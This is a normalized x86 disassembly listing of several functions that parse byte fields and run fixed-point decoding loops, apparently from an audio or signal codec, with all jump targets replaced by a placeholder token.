mov [ edi + 0x12c ] eax
sub_409f50
mov ecx [ esp + 0x8 ]
cmp [ ecx ] 0x4
mov eax [ ecx + 0x4 ]
je r-xdata
movzx edx [ eax ]
mov ecx [ esp + 0x4 ]
add eax 0x1
mov [ ecx + 0x118 ] dl
movzx edx [ eax ]
add eax 0x1
mov [ ecx + 0x119 ] dl
movzx edx [ eax ]
mov [ ecx + 0x11a ] dl
mov al [ eax + 0x1 ]
mov [ ecx + 0x11b ] al
mov eax 0x1
retn
xor eax eax
retn
sub_409fa0
mov eax [ esp + 0x8 ]
mov edx [ eax ]
mov eax [ eax + 0x4 ]
push esi
xor ecx ecx
xor esi esi
test edx edx
je r-xdata
xor eax eax
pop esi
retn
cmp edx 0x5
jg r-xdata
push ebx
movsx ebx [ eax ]
push edi
mov edi [ esp + 0x10 ]
add eax 0x1
sub edx 0x1
mov [ edi + 0x1c ] ebx
je r-xdata
mov [ edi + 0x30 ] esi
pop edi
pop ebx
mov eax 0x1
pop esi
retn
jmp r-xdata
movsx ebx [ eax ]
shl ebx cl
add eax 0x1
add ecx 0x8
or esi ebx
sub edx 0x1
jne r-xdata
sub_40a000
mov eax [ esp + 0x8 ]
cmp [ eax ] 0x3
mov ecx [ eax + 0x4 ]
jl r-xdata
mov eax 0x1
retn
mov eax [ esp + 0x4 ]
and [ eax + 0x14 ] 0xff
xor edx edx
mov dh [ ecx ]
push esi
mov esi [ eax + 0x14 ]
add ecx 0x1
or edx esi
mov [ eax + 0x14 ] edx
movzx edx [ ecx ]
shl edx 0x10
or [ eax + 0x14 ] edx
movzx ecx [ ecx + 0x1 ]
mov edx [ eax + 0x14 ]
shl ecx 0x18
or ecx edx
mov [ eax + 0x14 ] ecx
pop esi
sub_40a050
mov eax [ esp + 0x8 ]
cmp [ eax ] 0x3
mov ecx [ eax + 0x4 ]
jne r-xdata
mov eax 0x1
retn
movzx edx [ ecx ]
mov eax [ esp + 0x4 ]
mov [ eax + 0x2c ] edx
add ecx 0x1
xor edx edx
mov dh [ ecx ]
or [ eax + 0x2c ] edx
movzx ecx [ ecx + 0x1 ]
mov edx [ eax + 0x2c ]
shl ecx 0x10
or ecx edx
mov [ eax + 0x2c ] ecx
sub_40a090
push esi
mov esi [ esp + 0x8 ]
test [ esi + 0x9c ] 0x4
je r-xdata
mov eax 0x1
pop esi
retn
mov eax [ esi + 0x60 ]
cmp eax 0x1000000
jae r-xdata
mov edx [ esi + 0x5c ]
push edi
mov edi [ esp + 0x10 ]
mov ecx [ edi ]
add ecx eax
push ecx
push edx
call sub_41026d
mov [ esi + 0x5c ] eax
mov ecx [ edi ]
mov edx [ edi + 0x4 ]
push ecx
mov ecx [ esi + 0x60 ]
push edx
add ecx eax
push ecx
call sub_410ec0
mov edx [ edi ]
add esp 0x14
add [ esi + 0x60 ] edx
pop edi
sub_40a0e0
sub esp 0x8
push ebx
push ebp
push esi
push edi
mov edi [ eax ]
mov esi edx
lea ebp [ esi + ecx * 8 ]
lea ecx [ edi + 0x3 ]
cmp ecx 0x15
mov [ esp + 0x10 ] ebp
ja r-xdata
xor ebx ebx
and edi 0x7
cmp esi ebp
mov [ esp + 0x14 ] ebx
jae r-xdata
movzx edx [ ecx + lookup_table_40a71c ]
jmp [ edx * 4 + jump_table_40a704 ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
jmp r-xdata
cmp esi ebp
mov edi esi
jae r-xdata
cmp esi ebp
mov edi esi
jae r-xdata
cmp esi ebp
mov ebx esi
jae r-xdata
cmp esi ebp
mov ebx esi
jae r-xdata
cmp esi ebp
jae r-xdata
mov edx [ eax + ebx * 4 + 0x10 ]
movsx ecx dx
cmp edx ecx
mov ecx [ eax + 0x8 ]
je r-xdata
mov ecx [ eax + 0x10 ]
lea edx [ ecx + ecx ]
sub edx [ eax + 0x14 ]
mov [ eax + 0x14 ] ecx
movsx ecx dx
cmp edx ecx
mov ecx [ eax + 0x8 ]
je r-xdata
jmp r-xdata
mov ebp 0x400
mov ebp 0x400
mov ecx [ eax + 0x10 ]
movsx edx cx
cmp ecx edx
mov edx [ eax + 0x8 ]
je r-xdata
imul ecx edx
add ecx 0x200
sar ecx 0xa
mov ebx edx
sar ebx 0x9
mov ebp edx
and ebp 0xffff
and ebx 0xffffff80
imul ebp ecx
imul ebx ecx
sar ebp 0x9
lea ecx [ ebx + ebp + 0x1 ]
mov ebx [ esp + 0x14 ]
sar ecx 0x1
jmp r-xdata
imul ecx edx
add ecx 0x200
sar ecx 0xa
mov esi edx
sar esi 0x9
mov ebx edx
and ebx 0xffff
imul ebx ecx
and esi 0xffffff80
imul esi ecx
sar ebx 0x9
lea ecx [ esi + ebx + 0x1 ]
sar ecx 0x1
jmp r-xdata
mov edx [ eax + 0x10 ]
mov ecx edx
sub ecx [ eax + 0x14 ]
mov [ eax + 0x14 ] edx
sar ecx 0x1
add ecx edx
movsx edx cx
cmp ecx edx
mov edx [ eax + 0x8 ]
je r-xdata
imul ecx edi
add ecx 0x200
sar ecx 0xa
mov edx edi
sar edx 0x9
mov esi edi
and esi 0xffff
imul esi ecx
and edx 0xffffff80
imul edx ecx
sar esi 0x9
lea ecx [ edx + esi + 0x1 ]
sar ecx 0x1
jmp r-xdata
imul ecx edi
add ecx 0x200
sar ecx 0xa
mov edx edi
sar edx 0x9
mov esi edi
and esi 0xffff
imul esi ecx
and edx 0xffffff80
imul edx ecx
sar esi 0x9
lea ecx [ edx + esi + 0x1 ]
sar ecx 0x1
jmp r-xdata
imul edx ecx
add edx 0x200
sar edx 0xa
mov edi ecx
sar edi 0x9
mov ebx ecx
and ebx 0xffff
imul ebx edx
and edi 0xffffff80
imul edi edx
sar ebx 0x9
lea edx [ edi + ebx + 0x1 ]
sar edx 0x1
jmp r-xdata
mov ecx [ eax + edi * 4 + 0x10 ]
mov [ esi ] ecx
mov edx [ eax + ebx * 4 + 0x30 ]
movsx ecx dx
cmp edx ecx
mov ecx [ eax + 0xc ]
je r-xdata
mov ecx [ esi ]
test ecx ecx
je r-xdata
mov ebp [ esi ]
add ebp ecx
test edx edx
mov [ eax + edi * 4 + 0x10 ] ebp
je r-xdata
mov ecx [ eax + 0x30 ]
lea edx [ ecx + ecx ]
sub edx [ eax + 0x34 ]
mov [ eax + 0x34 ] ecx
movsx ecx dx
cmp edx ecx
mov ecx [ eax + 0xc ]
je r-xdata
test esi esi
je r-xdata
mov esi [ edi ]
add ecx esi
test edx edx
mov [ eax + 0x10 ] ecx
mov [ edi ] ecx
je r-xdata
imul edx ecx
add edx 0x200
sar edx 0xa
mov esi ecx
sar esi 0x9
mov ebx ecx
and ebx 0xffff
imul ebx edx
and esi 0xffffff80
imul esi edx
sar ebx 0x9
lea edx [ esi + ebx + 0x1 ]
sar edx 0x1
jmp r-xdata
movsx edx si
cmp esi edx
mov [ ebx ] esi
mov ecx [ eax + 0xc ]
je r-xdata
test edx edx
je r-xdata
test edi edi
mov edx [ ebx ]
lea esi [ edx + ecx ]
je r-xdata
movsx edx si
cmp esi edx
mov [ ebx + 0x4 ] esi
mov ecx [ eax + 0x8 ]
je r-xdata
test edx edx
je r-xdata
test edi edi
mov edx [ ebx + 0x4 ]
lea esi [ edx + ecx ]
je r-xdata
mov ecx [ eax + 0x30 ]
movsx edx cx
cmp ecx edx
mov edx [ eax + 0xc ]
je r-xdata
test edi edi
je r-xdata
test ecx ecx
mov edi [ esi ]
lea ebp [ edx + edi ]
je r-xdata
imul ecx edx
add ecx 0x200
sar ecx 0xa
mov ebx edx
sar ebx 0x9
mov ebp edx
and ebp 0xffff
and ebx 0xffffff80
imul ebp ecx
imul ebx ecx
sar ebp 0x9
lea ecx [ ebx + ebp + 0x1 ]
mov ebx [ esp + 0x14 ]
sar ecx 0x1
jmp r-xdata
xor ecx edx
mov edx [ eax + 0x4 ]
sar ecx 0x1f
xor edx ecx
sub edx ecx
add [ eax + 0x8 ] edx
imul ecx edx
add ecx 0x200
sar ecx 0xa
mov esi edx
sar esi 0x9
mov ebx edx
and ebx 0xffff
imul ebx ecx
and esi 0xffffff80
imul esi ecx
sar ebx 0x9
lea ecx [ esi + ebx + 0x1 ]
sar ecx 0x1
jmp r-xdata
xor esi edx
mov edx [ eax + 0x4 ]
sar esi 0x1f
xor edx esi
sub edx esi
add [ eax + 0x8 ] edx
mov edx [ eax + 0x30 ]
mov ecx edx
sub ecx [ eax + 0x34 ]
mov [ eax + 0x34 ] edx
sar ecx 0x1
add ecx edx
movsx edx cx
cmp ecx edx
mov edx [ eax + 0xc ]
je r-xdata
test esi esi
je r-xdata
mov esi [ edi ]
add edx esi
test ecx ecx
mov [ eax + 0x10 ] edx
mov [ edi ] edx
je r-xdata
imul ecx esi
add ecx 0x200
sar ecx 0xa
mov edx esi
sar edx 0x9
mov edi esi
and edi 0xffff
imul edi ecx
and edx 0xffffff80
imul edx ecx
sar edi 0x9
lea ecx [ edx + edi + 0x1 ]
sar ecx 0x1
jmp r-xdata
mov ecx [ eax + 0x8 ]
xor edx edi
sar edx 0x1f
xor ecx edx
add ecx [ eax + 0x4 ]
sub ecx edx
cmp ecx ebp
mov [ eax + 0x8 ] ecx
jle r-xdata
imul ecx esi
add ecx 0x200
sar ecx 0xa
mov edx esi
sar edx 0x9
mov edi esi
and edi 0xffff
imul edi ecx
and edx 0xffffff80
imul edx ecx
sar edi 0x9
lea ecx [ edx + edi + 0x1 ]
sar ecx 0x1
jmp r-xdata
mov ecx [ eax + 0xc ]
xor edx edi
sar edx 0x1f
xor ecx edx
add ecx [ eax + 0x4 ]
sub ecx edx
cmp ecx ebp
mov [ eax + 0xc ] ecx
jle r-xdata
imul edx ecx
add edx 0x200
sar edx 0xa
mov edi ecx
sar edi 0x9
mov ebx ecx
and ebx 0xffff
imul ebx edx
and edi 0xffffff80
imul edi edx
sar ebx 0x9
lea edx [ edi + ebx + 0x1 ]
sar edx 0x1
jmp r-xdata
mov edx [ eax + 0x8 ]
xor ecx edi
sar ecx 0x1f
xor edx ecx
add edx [ eax + 0x4 ]
sub edx ecx
cmp edx 0x400
mov [ eax + 0x8 ] edx
jle r-xdata
mov ecx [ eax + edi * 4 + 0x30 ]
add ebx 0x1
add edi 0x1
mov [ esi + 0x4 ] ecx
and ebx 0x7
add esi 0x8
and edi 0x7
cmp esi [ esp + 0x10 ]
mov [ esp + 0x14 ] ebx
jb r-xdata
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov ebp [ esi + 0x4 ]
add ebp ecx
test edx edx
mov [ eax + edi * 4 + 0x30 ] ebp
je r-xdata
add edi 0x8
cmp edi ebp
jb r-xdata
test esi esi
je r-xdata
mov esi [ edi + 0x4 ]
add ecx esi
test edx edx
mov [ eax + 0x30 ] ecx
mov [ edi + 0x4 ] ecx
je r-xdata
imul edx ecx
add edx 0x200
sar edx 0xa
mov esi ecx
sar esi 0x9
mov ebx ecx
and ebx 0xffff
imul ebx edx
and esi 0xffffff80
imul esi edx
sar ebx 0x9
lea edx [ esi + ebx + 0x1 ]
sar edx 0x1
jmp r-xdata
xor esi ecx
mov ecx [ eax + 0x4 ]
sar esi 0x1f
xor ecx esi
sub ecx esi
add [ eax + 0x8 ] ecx
mov edx [ eax + 0x10 ]
mov [ ebx + 0x4 ] edx
add ebx 0x8
cmp ebx [ esp + 0x10 ]
jb r-xdata
mov ecx [ ebx + 0x4 ]
test ecx ecx
je r-xdata
mov edx [ ebx + 0x4 ]
add edx ecx
test esi esi
mov [ eax + 0x10 ] edx
je r-xdata
mov ecx [ eax + 0x8 ]
xor ecx edx
sub ecx edx
mov [ eax + 0x8 ] ecx
mov [ eax + 0x8 ] ebp
mov edx [ eax + 0x30 ]
mov [ ebx ] edx
add ebx 0x8
cmp ebx [ esp + 0x10 ]
jb r-xdata
mov ecx [ ebx ]
test ecx ecx
je r-xdata
mov edx [ ebx ]
add edx ecx
test esi esi
mov [ eax + 0x30 ] edx
je r-xdata
mov ecx [ eax + 0xc ]
xor ecx edx
sub ecx edx
mov [ eax + 0xc ] ecx
mov [ eax + 0xc ] ebp
mov [ eax + 0x30 ] ebp
mov [ esi ] ebp
mov [ eax + 0x10 ] ebx
mov [ esi + 0x4 ] ebx
add esi 0x8
cmp esi [ esp + 0x10 ]
jb r-xdata
test edi edi
je r-xdata
test ecx ecx
mov edi [ esi + 0x4 ]
lea ebx [ edx + edi ]
je r-xdata
mov edx [ eax + 0x8 ]
xor edx ecx
sub edx ecx
mov [ eax + 0x8 ] edx
mov [ eax + 0x8 ] 0x400
xor ecx edx
mov edx [ eax + 0x4 ]
sar ecx 0x1f
xor edx ecx
sub edx ecx
add [ eax + 0xc ] edx
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
xor esi edx
mov edx [ eax + 0x4 ]
sar esi 0x1f
xor edx esi
sub edx esi
add [ eax + 0xc ] edx
add edi 0x8
cmp edi ebp
jb r-xdata
test esi esi
je r-xdata
mov esi [ edi + 0x4 ]
add edx esi
test ecx ecx
mov [ eax + 0x30 ] edx
mov [ edi + 0x4 ] edx
je r-xdata
mov edi [ eax + 0x10 ]
mov ecx [ eax + 0x8 ]
movsx edx di
cmp edi edx
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
xor ecx esi
sar ecx 0x1f
mov edx ecx
mov ecx [ eax + 0xc ]
xor ecx edx
add ecx [ eax + 0x4 ]
sub ecx edx
cmp ecx ebp
mov [ eax + 0xc ] ecx
jle r-xdata
mov edi [ eax + 0x30 ]
movsx ecx di
cmp edi ecx
mov ecx [ eax + 0xc ]
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
xor ecx esi
sar ecx 0x1f
mov edx ecx
mov ecx [ eax + 0x8 ]
xor ecx edx
add ecx [ eax + 0x4 ]
sub ecx edx
cmp ecx ebp
mov [ eax + 0x8 ] ecx
jle r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
mov edx [ eax + 0xc ]
xor ecx edi
sar ecx 0x1f
xor edx ecx
add edx [ eax + 0x4 ]
sub edx ecx
cmp edx 0x400
mov [ eax + 0xc ] edx
jle r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
xor esi ecx
mov ecx [ eax + 0x4 ]
sar esi 0x1f
xor ecx esi
sub ecx esi
add [ eax + 0xc ] ecx
mov ecx [ eax + 0xc ]
xor ecx edx
sub ecx edx
mov [ eax + 0xc ] ecx
mov [ eax + 0xc ] ebp
mov ecx [ eax + 0x8 ]
xor ecx edx
sub ecx edx
mov [ eax + 0x8 ] ecx
mov [ eax + 0x8 ] ebp
mov edx [ eax + 0xc ]
xor edx ecx
sub edx ecx
mov [ eax + 0xc ] edx
mov [ eax + 0xc ] 0x400
sub_40a740
push ecx
push ebx
push ebp
push esi
mov esi edx
mov edx [ eax ]
lea ebx [ esi + ecx * 8 ]
lea ecx [ edx + 0x3 ]
cmp ecx 0x15
push edi
mov [ esp + 0x10 ] ebx
ja r-xdata
xor edi edi
and edx 0x7
cmp esi ebx
mov ecx esi
jae r-xdata
movzx ecx [ ecx + lookup_table_40ab64 ]
jmp [ ecx * 4 + jump_table_40ab4c ]
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
mov esi [ eax + edi * 4 + 0x10 ]
mov ebp [ eax + 0x8 ]
imul ebp esi
add ebp 0x200
sar ebp 0xa
add ebp [ ecx ]
test esi esi
mov [ eax + edx * 4 + 0x10 ] ebp
je r-xdata
cmp esi ebx
jae r-xdata
cmp esi ebx
jae r-xdata
cmp esi ebx
mov edi esi
jae r-xdata
cmp esi ebx
mov edi esi
jae r-xdata
cmp esi ebx
mov edi esi
jae r-xdata
mov esi [ eax + edx * 4 + 0x10 ]
mov [ ecx ] esi
mov esi [ eax + edi * 4 + 0x30 ]
mov ebp [ eax + 0xc ]
imul ebp esi
add ebp 0x200
sar ebp 0xa
add ebp [ ecx + 0x4 ]
test esi esi
mov [ eax + edx * 4 + 0x30 ] ebp
je r-xdata
mov ebx [ ecx ]
test ebx ebx
je r-xdata
mov ecx [ eax + 0x10 ]
mov edi [ eax + 0x8 ]
mov edx [ eax + 0x10 ]
add ecx ecx
sub ecx [ eax + 0x14 ]
mov [ eax + 0x14 ] edx
mov edx [ esi ]
imul edi ecx
add edi 0x200
sar edi 0xa
add edi edx
test ecx ecx
mov [ eax + 0x10 ] edi
mov [ esi ] edi
je r-xdata
mov edx [ eax + 0x10 ]
mov edi [ eax + 0x8 ]
mov ecx edx
sub ecx [ eax + 0x14 ]
mov [ eax + 0x14 ] edx
sar ecx 0x1
add ecx edx
mov edx [ esi ]
imul edi ecx
add edi 0x200
sar edi 0xa
add edi edx
test ecx ecx
mov [ eax + 0x10 ] edi
mov [ esi ] edi
je r-xdata
mov ebp 0x400
mov ebp 0x400
mov ebp 0x400
mov esi [ eax + edx * 4 + 0x30 ]
add edi 0x1
add edx 0x1
mov [ ecx + 0x4 ] esi
add ecx 0x8
and edi 0x7
and edx 0x7
cmp ecx ebx
jb r-xdata
mov ebx [ ecx + 0x4 ]
test ebx ebx
je r-xdata
mov ebx [ esp + 0x10 ]
xor ebx esi
mov esi [ eax + 0x4 ]
sar ebx 0x1f
xor esi ebx
sub esi ebx
add [ eax + 0x8 ] esi
mov ecx [ eax + 0x30 ]
mov edi [ eax + 0xc ]
mov edx [ eax + 0x30 ]
add ecx ecx
sub ecx [ eax + 0x34 ]
mov [ eax + 0x34 ] edx
mov edx [ esi + 0x4 ]
imul edi ecx
add edi 0x200
sar edi 0xa
add edi edx
test ecx ecx
mov [ eax + 0x30 ] edi
mov [ esi + 0x4 ] edi
je r-xdata
test edx edx
je r-xdata
mov edx [ eax + 0x30 ]
mov edi [ eax + 0xc ]
mov ecx edx
sub ecx [ eax + 0x34 ]
mov [ eax + 0x34 ] edx
sar ecx 0x1
add ecx edx
mov edx [ esi + 0x4 ]
imul edi ecx
add edi 0x200
sar edi 0xa
add edi edx
test ecx ecx
mov [ eax + 0x30 ] edi
mov [ esi + 0x4 ] edi
je r-xdata
test edx edx
je r-xdata
mov [ edi ] ecx
mov edx [ eax + 0xc ]
imul edx ecx
add edx 0x200
sar edx 0xa
add edx [ edi + 0x4 ]
test ecx ecx
mov [ eax + 0x10 ] edx
je r-xdata
test edx edx
je r-xdata
mov [ edi + 0x4 ] ecx
mov edx [ eax + 0x8 ]
imul edx ecx
add edx 0x200
sar edx 0xa
add edx [ edi ]
test ecx ecx
mov [ eax + 0x30 ] edx
je r-xdata
test edx edx
je r-xdata
mov ebx [ eax + 0x30 ]
mov ecx [ eax + 0xc ]
mov esi [ edi + 0x4 ]
imul ecx ebx
add ecx 0x200
sar ecx 0xa
add ecx esi
test ebx ebx
je r-xdata
test ecx ecx
je r-xdata
mov ebx [ esp + 0x10 ]
xor ebx esi
mov esi [ eax + 0x4 ]
sar ebx 0x1f
xor esi ebx
sub esi ebx
add [ eax + 0xc ] esi
add esi 0x8
cmp esi ebx
jb r-xdata
test edx edx
je r-xdata
xor edx ecx
mov ecx [ eax + 0x4 ]
sar edx 0x1f
xor ecx edx
sub ecx edx
add [ eax + 0x8 ] ecx
add esi 0x8
cmp esi ebx
jb r-xdata
test edx edx
je r-xdata
xor edx ecx
mov ecx [ eax + 0x4 ]
sar edx 0x1f
xor ecx edx
sub ecx edx
add [ eax + 0x8 ] ecx
mov edx [ eax + 0x10 ]
mov [ edi + 0x4 ] edx
add edi 0x8
cmp edi ebx
jb r-xdata
mov edx [ edi + 0x4 ]
test edx edx
je r-xdata
xor edx esi
sar edx 0x1f
mov esi edx
mov edx [ eax + 0x8 ]
xor edx esi
add edx [ eax + 0x4 ]
sub edx esi
cmp edx ebp
mov [ eax + 0x8 ] edx
jle r-xdata
mov edx [ eax + 0x30 ]
mov [ edi ] edx
add edi 0x8
cmp edi ebx
jb r-xdata
mov edx [ edi ]
test edx edx
je r-xdata
xor edx esi
sar edx 0x1f
mov esi edx
mov edx [ eax + 0xc ]
xor edx esi
add edx [ eax + 0x4 ]
sub edx esi
cmp edx ebp
mov [ eax + 0xc ] edx
jle r-xdata
mov [ eax + 0x30 ] edx
mov [ edi ] edx
mov [ eax + 0x10 ] ecx
mov [ edi + 0x4 ] ecx
add edi 0x8
cmp edi [ esp + 0x10 ]
jb r-xdata
test esi esi
je r-xdata
xor ecx esi
sar ecx 0x1f
mov esi ecx
mov ecx [ eax + 0x8 ]
xor ecx esi
add ecx [ eax + 0x4 ]
sub ecx esi
cmp ecx ebp
mov [ eax + 0x8 ] ecx
jle r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
xor edx ecx
mov ecx [ eax + 0x4 ]
sar edx 0x1f
xor ecx edx
sub ecx edx
add [ eax + 0xc ] ecx
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
xor edx ecx
mov ecx [ eax + 0x4 ]
sar edx 0x1f
xor ecx edx
sub ecx edx
add [ eax + 0xc ] ecx
mov esi [ eax + 0x10 ]
mov ecx [ eax + 0x8 ]
mov edx [ edi ]
imul ecx esi
add ecx 0x200
sar ecx 0xa
add ecx edx
test esi esi
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
xor edx ecx
mov ecx [ eax + 0xc ]
sar edx 0x1f
xor ecx edx
add ecx [ eax + 0x4 ]
sub ecx edx
cmp ecx ebp
mov [ eax + 0xc ] ecx
jle r-xdata
mov edx [ eax + 0x8 ]
xor edx esi
sub edx esi
mov [ eax + 0x8 ] edx
mov [ eax + 0x8 ] ebp
mov esi [ eax + 0x30 ]
mov ecx [ eax + 0xc ]
mov edx [ edi + 0x4 ]
imul ecx esi
add ecx 0x200
sar ecx 0xa
add ecx edx
test esi esi
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
xor edx ecx
mov ecx [ eax + 0x8 ]
sar edx 0x1f
xor ecx edx
add ecx [ eax + 0x4 ]
sub ecx edx
cmp ecx ebp
mov [ eax + 0x8 ] ecx
jle r-xdata
mov edx [ eax + 0xc ]
xor edx esi
sub edx esi
mov [ eax + 0xc ] edx
mov [ eax + 0xc ] ebp
mov esi [ eax + 0x10 ]
mov edx [ eax + 0x8 ]
mov ecx [ edi ]
imul edx esi
add edx 0x200
sar edx 0xa
add edx ecx
test esi esi
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
xor esi ebx
sar esi 0x1f
mov ebx esi
mov esi [ eax + 0xc ]
xor esi ebx
add esi [ eax + 0x4 ]
sub esi ebx
cmp esi ebp
mov [ eax + 0xc ] esi
jle r-xdata
mov ecx [ eax + 0x8 ]
xor ecx esi
sub ecx esi
mov [ eax + 0x8 ] ecx
mov [ eax + 0x8 ] ebp
mov ecx [ eax + 0xc ]
xor ecx edx
sub ecx edx
mov [ eax + 0xc ] ecx
mov [ eax + 0xc ] ebp
mov ecx [ eax + 0x8 ]
xor ecx edx
sub ecx edx
mov [ eax + 0x8 ] ecx
mov [ eax + 0x8 ] ebp
mov esi [ eax + 0xc ]
xor esi ebx
sub esi ebx
mov [ eax + 0xc ] esi
mov [ eax + 0xc ] ebp
sub_40ab80
push ebx
lea ebx [ edx + ecx * 8 ]
cmp edx ebx
jae r-xdata
pop ebx
retn
push esi
push edi
mov edi edi
mov esi [ eax + 0x70 ]
mov edi [ eax + 0x10 ]
mov ecx esi
sub ecx [ eax + 0x74 ]
mov [ eax + 0x74 ] esi
sar ecx 0x1
add ecx esi
mov esi [ eax + 0x68 ]
imul esi ecx
add esi 0x200
sar esi 0xa
add esi edi
test ecx ecx
mov [ eax + 0x70 ] esi
mov [ edx ] esi
je r-xdata
mov esi [ edx ]
test esi esi
je r-xdata
mov esi [ eax + 0x30 ]
mov edi [ eax + 0xc ]
lea ecx [ esi + esi ]
sub ecx [ eax + 0x34 ]
mov [ eax + 0x34 ] esi
mov esi edi
imul esi ecx
add esi 0x200
sar esi 0xa
add esi [ edx + 0x4 ]
test ecx ecx
mov [ eax + 0x30 ] esi
je r-xdata
mov esi [ eax + 0x10 ]
test esi esi
je r-xdata
xor esi ecx
mov ecx [ eax + 0x4 ]
sar esi 0x1f
xor ecx esi
sub ecx esi
add ecx edi
mov [ eax + 0x8 ] ecx
mov esi [ eax + 0x90 ]
mov edi [ eax + 0x30 ]
mov ecx esi
sub ecx [ eax + 0x94 ]
mov [ eax + 0x94 ] esi
sar ecx 0x1
add ecx esi
mov esi [ eax + 0x6c ]
imul esi ecx
add esi 0x200
sar esi 0xa
add esi edi
test ecx ecx
mov [ eax + 0x90 ] esi
mov [ edx + 0x4 ] esi
je r-xdata
mov esi [ edx + 0x4 ]
test esi esi
je r-xdata
xor esi ecx
mov ecx [ eax + 0x64 ]
sar esi 0x1f
xor ecx esi
sub ecx esi
add [ eax + 0x68 ] ecx
add edx 0x8
cmp edx ebx
jb r-xdata
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
xor esi ecx
mov ecx [ eax + 0x4 ]
sar esi 0x1f
xor ecx esi
sub ecx esi
add ecx edi
mov [ eax + 0xc ] ecx
mov esi [ eax + 0x10 ]
mov edi [ eax + 0x8 ]
lea ecx [ esi + esi ]
sub ecx [ eax + 0x14 ]
mov [ eax + 0x14 ] esi
mov esi edi
imul esi ecx
add esi 0x200
sar esi 0xa
add esi [ edx ]
test ecx ecx
mov [ eax + 0x10 ] esi
je r-xdata
pop edi
pop esi
xor esi ecx
mov ecx [ eax + 0x64 ]
sar esi 0x1f
xor ecx esi
sub ecx esi
add [ eax + 0x6c ] ecx
sub_40acb0
push ebx
lea ebx [ edx + ecx * 8 ]
cmp edx ebx
jae r-xdata
pop ebx
retn
push esi
push edi
mov edi edi
mov ecx [ eax + 0x70 ]
mov esi [ eax + 0x70 ]
mov edi [ eax + 0x10 ]
add ecx ecx
sub ecx [ eax + 0x74 ]
mov [ eax + 0x74 ] esi
mov esi [ eax + 0x68 ]
imul esi ecx
add esi 0x200
sar esi 0xa
add esi edi
test ecx ecx
mov [ eax + 0x70 ] esi
mov [ edx ] esi
je r-xdata
mov esi [ edx ]
test esi esi
je r-xdata
mov esi [ eax + 0x30 ]
mov edi [ eax + 0xc ]
lea ecx [ esi + esi ]
sub ecx [ eax + 0x34 ]
mov [ eax + 0x34 ] esi
mov esi edi
imul esi ecx
add esi 0x200
sar esi 0xa
add esi [ edx + 0x4 ]
test ecx ecx
mov [ eax + 0x30 ] esi
je r-xdata
mov esi [ eax + 0x10 ]
test esi esi
je r-xdata
xor esi ecx
mov ecx [ eax + 0x4 ]
sar esi 0x1f
xor ecx esi
sub ecx esi
add ecx edi
mov [ eax + 0x8 ] ecx
mov ecx [ eax + 0x90 ]
mov esi [ eax + 0x90 ]
mov edi [ eax + 0x30 ]
add ecx ecx
sub ecx [ eax + 0x94 ]
mov [ eax + 0x94 ] esi
mov esi [ eax + 0x6c ]
imul esi ecx
add esi 0x200
sar esi 0xa
add esi edi
test ecx ecx
mov [ eax + 0x90 ] esi
mov [ edx + 0x4 ] esi
je r-xdata
mov esi [ edx + 0x4 ]
test esi esi
je r-xdata
xor esi ecx
mov ecx [ eax + 0x64 ]
sar esi 0x1f
xor ecx esi
sub ecx esi
add [ eax + 0x68 ] ecx
add edx 0x8
cmp edx ebx
jb r-xdata
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
xor esi ecx
mov ecx [ eax + 0x4 ]
sar esi 0x1f
xor ecx esi
sub ecx esi
add ecx edi
mov [ eax + 0xc ] ecx
mov esi [ eax + 0x10 ]
mov edi [ eax + 0x8 ]
lea ecx [ esi + esi ]
sub ecx [ eax + 0x14 ]
mov [ eax + 0x14 ] esi
mov esi edi
imul esi ecx
add esi 0x200
sar esi 0xa
add esi [ edx ]
test ecx ecx
mov [ eax + 0x10 ] esi
je r-xdata
pop edi
pop esi
xor esi ecx
mov ecx [ eax + 0x64 ]
sar esi 0x1f
xor ecx esi
sub ecx esi
add [ eax + 0x6c ] ecx
sub_40ade0
push ebx
lea ebx [ edx + ecx * 8 ]
cmp edx ebx
jae r-xdata
pop ebx
retn
push esi
push edi
mov edi edi
mov esi [ eax + 0x70 ]
mov edi [ eax + 0x10 ]
mov ecx esi
sub ecx [ eax + 0x74 ]
mov [ eax + 0x74 ] esi
sar ecx 0x1
add ecx esi
mov esi [ eax + 0x68 ]
imul esi ecx
add esi 0x200
sar esi 0xa
add esi edi
test ecx ecx
mov [ eax + 0x70 ] esi
mov [ edx ] esi
je r-xdata
mov esi [ edx ]
test esi esi
je r-xdata
mov esi [ eax + 0x30 ]
mov edi [ eax + 0xc ]
mov ecx esi
sub ecx [ eax + 0x34 ]
mov [ eax + 0x34 ] esi
sar ecx 0x1
add ecx esi
mov esi edi
imul esi ecx
add esi 0x200
sar esi 0xa
add esi [ edx + 0x4 ]
test ecx ecx
mov [ eax + 0x30 ] esi
je r-xdata
mov esi [ eax + 0x10 ]
test esi esi
je r-xdata
xor esi ecx
mov ecx [ eax + 0x4 ]
sar esi 0x1f
xor ecx esi
sub ecx esi
add ecx edi
mov [ eax + 0x8 ] ecx
mov esi [ eax + 0x90 ]
mov edi [ eax + 0x30 ]
mov ecx esi
sub ecx [ eax + 0x94 ]
mov [ eax + 0x94 ] esi
sar ecx 0x1
add ecx esi
mov esi [ eax + 0x6c ]
imul esi ecx
add esi 0x200
sar esi 0xa
add esi edi
test ecx ecx
mov [ eax + 0x90 ] esi
mov [ edx + 0x4 ] esi
je r-xdata
mov esi [ edx + 0x4 ]
test esi esi
je r-xdata
xor esi ecx
mov ecx [ eax + 0x64 ]
sar esi 0x1f
xor ecx esi
sub ecx esi
add [ eax + 0x68 ] ecx
add edx 0x8
cmp edx ebx
jb r-xdata
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
xor esi ecx
mov ecx [ eax + 0x4 ]
sar esi 0x1f
